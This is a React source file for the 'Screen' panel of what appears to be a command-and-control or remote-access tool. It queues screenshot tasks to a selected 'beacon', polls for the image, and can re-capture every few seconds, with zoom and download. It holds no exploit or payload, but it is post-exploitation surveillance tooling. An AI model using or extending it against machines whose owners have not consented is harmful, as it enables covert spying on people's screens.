import { useCallback, useEffect, useRef, useState } from 'react'
import type { Beacon } from '../../../shared/ipc'
import { invoke } from '../hooks'
import EmptyState from '../ui/EmptyState'
import IconButton from '../ui/IconButton'
import { Toolbar, ToolbarSpacer, ToolbarTitle } from '../ui/Toolbar'

function decode(s: string): string {
  try {
    const raw = atob(s)
    const bytes = Uint8Array.from(raw, (c) => c.charCodeAt(0))
    return new TextDecoder().decode(bytes)
  } catch {
    return s
  }
}

export default function Screen(props: {
  beacon: Beacon | null
  onToast: (text: string, kind?: 'ok' | 'err' | 'info') => void
}): JSX.Element {
  const id = props.beacon?.id ?? 0
  const [png, setPng] = useState('')
  const [err, setErr] = useState('')
  const [at, setAt] = useState(0)
  const [zoom, setZoom] = useState(1)
  const [pan, setPan] = useState({ x: 0, y: 0 })
  const [every, setEvery] = useState(0)
  const [busy, setBusy] = useState(false)
  const [dragging, setDragging] = useState(false)
  const drag = useRef<{ x: number; y: number; px: number; py: number } | null>(null)
  const busyRef = useRef(false)
  const liveId = useRef(id)

  useEffect(() => {
    liveId.current = id
    setPng('')
    setErr('')
    setAt(0)
    setZoom(1)
    setPan({ x: 0, y: 0 })
  }, [id])

  const capture = useCallback(async (silent = false) => {
    if (!id || busyRef.current) return
    busyRef.current = true
    setBusy(true)
    setErr('')
    try {
      const r = (await invoke('task', { id, verb: 'screenshot', args: [] })) as {
        task_id?: string
      }
      if (!r.task_id) throw new Error('screenshot not queued')
      for (let i = 0; i < 45; i++) {
        if (liveId.current !== id) return
        const res = (await invoke('task.result', {
          id, taskId: r.task_id, wait: 2
        })) as { ready?: boolean; output?: string; error?: string }
        if (!res.ready) continue
        if (res.error) throw new Error(res.error)
        const b64 = (res.output ?? '').trim()
        if (!b64) throw new Error('empty capture')
        if (liveId.current !== id) return
        setPng(`data:image/png;base64,${b64}`)
        setAt(Date.now())
        if (!silent) props.onToast('screen captured', 'ok')
        return
      }
      throw new Error('capture timed out')
    } catch (e) {
      const msg = (e as Error).message
      setErr(msg)
      props.onToast(msg, 'err')
    } finally {
      busyRef.current = false
      setBusy(false)
    }
  }, [id, props])

  useEffect(() => {
    if (!every || !id) return
    const t = setInterval(() => void capture(true), every * 1000)
    return () => clearInterval(t)
  }, [every, id, capture])

  const b64 = png.startsWith('data:image/png;base64,')
    ? png.slice('data:image/png;base64,'.length) : ''

  if (!props.beacon) {
    return <EmptyState glyph="▣" title="No target selected"
      hint="pick a beacon in Targets to capture its screen" />
  }

  const unsupported = props.beacon.os && !/win/i.test(props.beacon.os)

  return (
    <div className="view screen">
      <Toolbar label="Screen">
        <ToolbarTitle>Screen</ToolbarTitle>
        <span className="mono muted">#{props.beacon.id}</span>
        <ToolbarSpacer />
        <label className="inline-field">
          <span>every</span>
          <select className="ui-input tiny-input" value={every}
            aria-label="Capture interval"
            onChange={(e) => setEvery(Number(e.target.value))}>
            <option value={0}>off</option>
            <option value={5}>5s</option>
            <option value={10}>10s</option>
            <option value={30}>30s</option>
          </select>
        </label>
        <IconButton label="Zoom out" onClick={() => setZoom((z) => Math.max(0.4, z - 0.2))}>−</IconButton>
        <span className="mono small muted">{Math.round(zoom * 100)}%</span>
        <IconButton label="Zoom in" onClick={() => setZoom((z) => Math.min(4, z + 0.2))}>+</IconButton>
        <IconButton label="Reset view" onClick={() => { setZoom(1); setPan({ x: 0, y: 0 }) }}>◎</IconButton>
        <IconButton label="Download capture" disabled={!b64} onClick={() => {
          const name = `screen-${props.beacon?.id}-${at}.png`
          void window.t2.saveBinary(name, b64)
            .then((p) => { if (p) props.onToast(`saved ${p}`, 'ok') })
            .catch((e) => props.onToast((e as Error).message, 'err'))
        }}>⤓</IconButton>
        <button className="btn primary" disabled={busy} onClick={() => void capture()}>
          {busy ? 'Capturing…' : 'Capture'}
        </button>
      </Toolbar>

      {err && <div className="banner err" role="alert">{err}</div>}
      {unsupported && (
        <div className="banner">
          Screenshot needs X11/Wayland on Linux and GDI on Windows; this
          and headless sessions can fail.
        </div>
      )}

      <div className={`screen-stage${dragging ? ' dragging' : ''}`}
        onWheel={(e) => setZoom((z) => Math.min(4, Math.max(0.4, z - e.deltaY * 0.001)))}
        onPointerDown={(e) => {
          if (!png) return
          drag.current = { x: e.clientX, y: e.clientY, px: pan.x, py: pan.y }
          setDragging(true)
          ;(e.target as HTMLElement).setPointerCapture?.(e.pointerId)
        }}
        onPointerMove={(e) => {
          if (!drag.current) return
          setPan({
            x: drag.current.px + e.clientX - drag.current.x,
            y: drag.current.py + e.clientY - drag.current.y
          })
        }}
        onPointerUp={() => { drag.current = null; setDragging(false) }}
        onPointerCancel={() => { drag.current = null; setDragging(false) }}>
        {png ? (
          <img src={png} alt={`Screen of ${props.beacon.display_name ?? props.beacon.id}`}
            draggable={false}
            style={{ transform: `translate(${pan.x}px, ${pan.y}px) scale(${zoom})` }} />
        ) : (
          <EmptyState glyph="▣" title={busy ? 'Capturing…' : 'No capture yet'}
            hint="Capture grabs the current desktop as PNG" />
        )}
      </div>

      <div className="foot-note mono">
        {at ? `last capture ${new Date(at).toLocaleTimeString()} · ${png.length} B`
          : 'no capture this session'}
      </div>
    </div>
  )
}
